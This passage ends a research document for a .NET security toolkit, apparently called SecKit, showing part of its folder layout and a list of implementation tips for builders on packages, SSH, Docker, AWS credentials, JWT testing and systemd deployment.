├── tests/
│   └── SecKit.Core.Tests/
├── docs/
│   └── v2-research.md
└── deploy/
    ├── seckit-agent.service      # Systemd unit
    └── install.ps1               # Windows install script
```

---

> **End of Research.** Builders: each section above contains complete, compilable code snippets.
> Copy and adapt into the appropriate project folders. Pay attention to:
> 1. NuGet package versions — check for latest before adding
> 2. SSH.NET async patterns — library is synchronous internally, wrap with Task.Run if needed
> 3. Docker.DotNet requires access to Docker socket (Unix socket or named pipe)
> 4. AWS SDK uses default credential chain — test with `aws configure` first
> 5. JWT testing requires a target endpoint for HTTP-based attacks
> 6. Blazor Server uses SignalR internally; timer polling works without extra config
> 7. Systemd service needs `Type=notify` — use `AddSystemd()` in the host builder
> 8. All privileged commands must go through the sudo handler with logging
